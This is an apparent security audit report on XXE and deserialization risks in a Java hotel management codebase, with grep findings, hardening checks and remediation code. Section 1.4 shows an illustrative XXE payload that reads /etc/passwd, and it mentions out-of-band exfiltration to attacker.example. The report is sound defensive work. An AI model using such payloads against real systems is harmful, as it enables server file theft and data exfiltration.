# Deserialization & XXE Audit — hotel-pms

Read-only audit. Scope: every `DocumentBuilderFactory` / `SAXParserFactory` /
`XMLInputFactory` / `TransformerFactory` / `SchemaFactory` / `Unmarshaller`/JAXB /
other XML parsing in the repo; Java native deserialization
(`ObjectInputStream`/`readObject`/`readUnshared`); Jackson polymorphic
deserialization (`enableDefaultTyping`/`activateDefaultTyping`/`@JsonTypeInfo`);
SnakeYAML `Yaml.load(...)`.

Method: `grep -r` across all `*.java` for each API, then manual review of every
hit's call graph to determine whether externally-supplied/untrusted bytes ever
reach the parser, followed by a line-by-line check of the standard XXE hardening
checklist for each factory instance that does.

---

## 1. XML parsing — full inventory

Exactly 3 files in the whole repo touch JAXP XML APIs. No `SAXParserFactory`,
`XMLInputFactory`, `Unmarshaller`/JAXB, or `XMLReader` usage exists anywhere —
only `DocumentBuilderFactory`, `TransformerFactory`, and `SchemaFactory`/`Validator`.

| # | File | API | Parses untrusted input? |
|---|------|-----|--------------------------|
| 1 | `billing-service/.../FatturaPAServiceImpl.java:319` | `DocumentBuilderFactory` | No — builds an empty in-memory `Document` |
| 2 | `billing-service/.../FatturaPAServiceImpl.java:537` | `TransformerFactory` | No — serializes the in-memory DOM built by #1 |
| 3 | `billing-service/.../FatturaPaXsdValidator.java:53,73` | `SchemaFactory` + `Validator` | Schema itself: no (bundled classpath XSD). XML being validated: no (same app-generated bytes as #1/#2) — see §1.3 for the full reasoning, this is the one the recon flagged for re-verification |
| 4 | `frontdesk-service/.../AlloggiatiWebSenderServiceImpl.java:330` | `DocumentBuilderFactory` | **Yes** — parses the SOAP response body returned by the Polizia di Stato portal over the network |

### 1.1 `FatturaPAServiceImpl.buildDocument()` (billing-service, line 315–338)

```java
final DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setNamespaceAware(true);
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);   // line 325
final DocumentBuilder builder = factory.newDocumentBuilder();
final Document doc = builder.newDocument();   // line 327 — builder.newDocument(), NOT builder.parse(...)
```

`builder.newDocument()` creates a brand-new, empty DOM tree — no `.parse()` call
exists anywhere on this factory. Every element below it (`FatturaElettronica`,
`CedentePrestatore`, `Sede`, etc.) is constructed with `doc.createElement(...)` +
`Element.setTextContent(...)` (see `el()`, line 553), which DOM-escapes content
automatically — there is no code path by which a `DOCTYPE`, external entity, or
any other XML markup could be injected via a hotel/guest field value (name,
address, VAT number, …), because those values are never concatenated into raw
XML text; they only ever become the *text content* of nodes built through the
DOM API.

**Verdict: not exploitable, no untrusted parsing occurs.** `disallow-doctype-decl`
is already set anyway (comment at line 321–324 correctly calls this "defense in
depth"). No `FEATURE_SECURE_PROCESSING` is set, but it's moot — there is no
`.parse()` call for it to protect. **No action needed.**

### 1.2 `FatturaPAServiceImpl.serialize()` (billing-service, line 536–551)

```java
final TransformerFactory tf = TransformerFactory.newInstance();
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");           // line 541
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");    // line 542
final Transformer transformer = tf.newTransformer();
...
transformer.transform(new DOMSource(doc), new StreamResult(out));
```

Only ever called with the in-memory `Document` built by §1.1 (`serialize(doc)`,
line 130) as an *identity transform* (no XSLT stylesheet is ever loaded —
`tf.newTransformer()` with no `Source` argument). `ACCESS_EXTERNAL_DTD`/
`ACCESS_EXTERNAL_STYLESHEET` are both locked to `""` regardless.

**Verdict: not exploitable — this Transformer never resolves an external
stylesheet or DTD, and hardening is already complete for what it does.** No
action needed.

### 1.3 `FatturaPaXsdValidator` (billing-service) — re-verification requested by recon

This is the one place in billing-service that does real **schema validation**
(a separate XXE surface from DOM parsing/serialization), so it deserves the
closer look the recon asked for.

**Two JAXP objects are in play:**

**(a) `SchemaFactory` — compiles the bundled FatturaPA XSD (line 51–63, ctor):**

```java
final SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
factory.setResourceResolver(resourceResolver());   // line 54
try (InputStream xsd = new ClassPathResource(FATTURAPA_XSD).getInputStream()) {
    this.schema = factory.newSchema(new StreamSource(xsd));   // line 56
}
```

No `setFeature`/`setProperty` call for `ACCESS_EXTERNAL_DTD`,
`ACCESS_EXTERNAL_SCHEMA`, or `XMLConstants.FEATURE_SECURE_PROCESSING` exists on
this factory. The XSD it compiles is bundled on the classpath
(`src/main/resources/xsd/Schema_VFPR12_v1.2.3.xsd`), not user input, and the one
external reference the schema itself makes (`<xs:import>` of the W3C XML-DSig
namespace) is intercepted by the custom `resourceResolver()` (line 98–105),
which redirects it to the bundled `xmldsig-core-schema.xsd` classpath copy and
returns `null` for anything else — so this factory is not reachable with
attacker-controlled bytes today, and even the "external" schema import is
deliberately redirected to a local file, not fetched from the network.

**(b) `Validator` — validates the generated XML (line 71–96, `validate(byte[] xml)`):**

```java
final Validator validator = schema.newValidator();   // line 73 — fresh per call
validator.setErrorHandler(...);                       // line 74
...
validator.validate(new StreamSource(new java.io.ByteArrayInputStream(xml)));   // line 91
```

No `setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "")` /
`ACCESS_EXTERNAL_SCHEMA` / `FEATURE_SECURE_PROCESSING` is set here either — this
is a genuine gap versus the checklist. **However**, tracing every caller of
`FatturaPaXsdValidator.validate(byte[])` confirms the `xml` parameter is *always*
the return value of `FatturaPAServiceImpl.serialize(doc)` (§1.2), which is
*always* the return value of `buildDocument(...)` (§1.1) — i.e. the exact same
DOM-built, escaped-text-content, no-DOCTYPE-ever document, run straight through
`Validator.validate()` in the same request. Confirmed via the controller layer
(`InvoiceController.java:246-276`): both `GET /{id}/fatturaPA` and
`GET /{id}/fatturaPA/validate` take only a `UUID` path variable — **there is no
endpoint anywhere in the repo that accepts an XML file upload or raw XML body**
for validation (matches recon §2's "nessun endpoint di upload file trovato").
So this `Validator` never sees attacker-supplied XML content either.

**Verdict: not currently exploitable** — same reasoning as §1.1/§1.2 (no
attacker-reachable input), but flagged as **LOW / defense-in-depth**, not
dismissed outright, because `FatturaPaXsdValidator.validate(byte[])` is a
general-purpose method on a `@Component` with no access modifier restricting
future callers, and unlike §1.1/§1.2 its signature literally accepts an
arbitrary `byte[]` — a future change that wires this method to a genuinely
external input (e.g. re-validating a returned/rejected XML from SDI, or an
admin "paste XML to validate" tool) would silently inherit the missing
hardening with no compiler or test signal. The JDK's default value for
`jdk.xml.accessExternalDTD`/`jdk.xml.accessExternalSchema` is `"all"`
(unrestricted) unless the system property is set or the attribute is set
programmatically — this repo does neither for `SchemaFactory`/`Validator` (it
does set both for `TransformerFactory` in §1.2, just not here), so the gap is
real, just not presently reachable.

**Remediation (defense-in-depth):**

```java
// In the constructor, on the SchemaFactory, before/after setResourceResolver:
factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

// In validate(byte[]), on the fresh Validator, before validator.validate(...):
validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
```

(`setProperty` here, not `setAttribute` — `SchemaFactory`/`Validator` expose
`ACCESS_EXTERNAL_DTD`/`ACCESS_EXTERNAL_SCHEMA` as JAXP *properties*, unlike
`TransformerFactory` which exposes them as *attributes*; mixing the two throws
`IllegalArgumentException` at runtime, so this distinction matters if applying
the fix.)

### 1.4 `AlloggiatiWebSenderServiceImpl.extractXmlText()` (frontdesk-service, line 325–344) — the one genuinely-external input

```java
final var factory = DocumentBuilderFactory.newInstance();
factory.setNamespaceAware(true);
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);   // line 332
final var doc = factory.newDocumentBuilder()
        .parse(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)));      // line 333-334
```

`xml` here is the raw SOAP response body returned by
`restOperations.postForEntity(serviceUrl, ...)` (line 290) — a real network
response from `https://alloggiatiweb.poliziadistato.it`. This is, as the recon
correctly flagged, the closest thing to attacker-reachable XML in the entire
repo: while the URL is fixed (not user input, no SSRF), the response body is
external, network-delivered content, and a MITM, DNS-spoofed, or compromised
endpoint scenario is the closest realistic threat model.

**Checked against the full checklist:**

| Hardening | Present? | Note |
|---|---|---|
| `disallow-doctype-decl=true` | **Yes**, line 332 | Strongest option — blocks `<!DOCTYPE` entirely |
| `external-general-entities=false` | N/A | Moot: no `DOCTYPE` is permitted at all, so no `<!ENTITY>` can ever be declared, general or parameter |
| `external-parameter-entities=false` | N/A | Same reasoning |
| `load-external-dtd=false` | N/A | Same reasoning — no DTD reference of any kind can be declared without a DOCTYPE |
| `FEATURE_SECURE_PROCESSING` | Not set | Redundant here — `disallow-doctype-decl` already blocks the entity-expansion ("billion laughs") vector too, since that also requires a DOCTYPE with `<!ENTITY>` declarations |
| `setXIncludeAware(false)` | Not called, but this is the JAXP default | XInclude is a separate feature from DTD/entity processing; default `false` means no action needed unless someone later flips it |

**Verdict: this parser is correctly and completely hardened** — `disallow-doctype-decl`
is, per the checklist itself, the strongest of the two documented options and
subsumes every other listed sub-control (you cannot have an external entity,
parameter entity, or externally-loaded DTD without first declaring a
`DOCTYPE`, which this setting forbids outright). The recon's prior claim that
"XXE hardening already present, `disallow-doctype-decl`" is **confirmed
accurate and complete** for this specific parser — no gap found here. Optional,
non-blocking suggestion: adding `factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)`
would cost nothing and is good hygiene for defense-in-depth against any future
JAXP implementation change, but it is not currently closing any real gap.

**Concrete attack scenario (theoretical, not exploitable today):** if
`disallow-doctype-decl` were ever removed here without a replacement (e.g. "fix"
that switches to `factory.newDocumentBuilder().parse(...)` with no hardening at
all because a future refactor drops the `setFeature` call), a malicious/
compromised endpoint impersonating the Polizia di Stato portal could return:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope><soap:Body><token>&xxe;</token></soap:Body></soap:Envelope>
```

`extractXmlText(response, "token")` would then return the contents of
`/etc/passwd` as the "token", which — depending on downstream handling — could
leak into logs (line 189: `log.debug(... ALLOGGIATI_TOKEN_OBTAINED)`, though
note the token value itself is *not* logged, only a marker) or into the next
SOAP request's `<Utente>`/`<token>` fields sent back to the (compromised)
endpoint, or trigger an out-of-band read via `SYSTEM "http://attacker.example/?leak"`.
This is purely illustrative of what the current `disallow-doctype-decl=true`
setting prevents — it is not a live vulnerability given the code as written.

## 2. Java native deserialization

`grep -rn "ObjectInputStream|readObject|readUnshared|ObjectOutputStream"` across
all `*.java` in the repo returned **zero matches**. No Java native
(de)serialization is used anywhere in the codebase.

`implements Serializable` appears in exactly 2 places, neither exploitable:

- `billing-service/.../domain/InvoiceSequenceId.java` — a JPA `@EmbeddedId`
  composite key class. JPA specification requires embeddable ID classes to
  implement `Serializable` (used internally by the persistence provider for
  cache keys / detached-entity identity), not because the app ever calls
  `ObjectInputStream.readObject()` on it. No untrusted bytes are ever
  deserialized through this.
- `frontdesk-service/.../rooms/dto/RoomResponse.java` — a response DTO record
  marked `Serializable`; likely unnecessary but inert, since Spring MVC
  serializes/deserializes this via Jackson (JSON), never via
  `ObjectInputStream`.

**Verdict: no findings.** No Java deserialization attack surface exists in
this repo.

## 3. Jackson polymorphic deserialization

`grep -rn "enableDefaultTyping|activateDefaultTyping|@JsonTypeInfo|PolymorphicTypeValidator"`
across all `*.java` returned **zero matches** in application code. The only
`new ObjectMapper()` construction sites are in **test** files (17 controller
test classes), each a plain default-configured `ObjectMapper` used to serialize
request bodies for MockMvc — default Jackson configuration has polymorphic
("default typing") deserialization **disabled** unless explicitly turned on,
which none of these do.

All production DTOs are plain Java records/POJOs with no `@JsonTypeInfo`,
`@JsonSubTypes`, or global default-typing module registered anywhere (checked
also for any custom `Jackson2ObjectMapperBuilder`/`ObjectMapper` `@Bean`
definitions — none found configuring default typing).

**Verdict: no findings.** No unrestricted polymorphic Jackson deserialization
exists in this repo.

## 4. SnakeYAML

`grep -rn "Yaml\(|new Yaml|\.load\(|SnakeYaml|org\.yaml\.snakeyaml"` across all
`*.java` returned **zero matches**. No application code anywhere constructs a
SnakeYAML `Yaml` object or calls `.load(...)` directly.

The only YAML processing in the repo is Spring Boot's own startup-time loading
of `application.yml`/`application-<service>.yml`/`config/*.yml` (via Spring
Cloud Config), which is framework code, not app code, and is out of this
audit's scope — Spring Boot's `YamlPropertiesFactoryBean` internally
constructs SnakeYAML's `Yaml` bound to a restricted representer, not the
permissive default `Constructor` that the classic SnakeYAML RCE (arbitrary
object instantiation via `!!` tags) requires, and in any case none of these
YAML files are ever attacker-supplied — they are static files baked into the
image / mounted from the config-service's git-backed repo.

**Verdict: no findings.** No unsafe SnakeYAML usage exists in application code.

## 5. Redis-stored blobs

Checked because the recon flagged Redis as a shared store (`InternalAuthFilter`
nonce store, auth-service refresh-token blacklist, gateway rate limiter).
`grep` for `RedisSerializer`/`JdkSerializationRedisSerializer`/
`GenericJackson2JsonRedisSerializer`/`RedisTemplate` shows **every** injection
point across all 6 services uses `StringRedisTemplate` exclusively — this
serializes keys/values as plain UTF-8 strings only, with no Java object
serialization and no Jackson polymorphic typing involved. There is no code path
where a value written to (or read from) Redis is passed through
`ObjectInputStream` or a polymorphic Jackson deserializer.

**Verdict: no findings.** Redis usage in this repo carries no deserialization
attack surface.
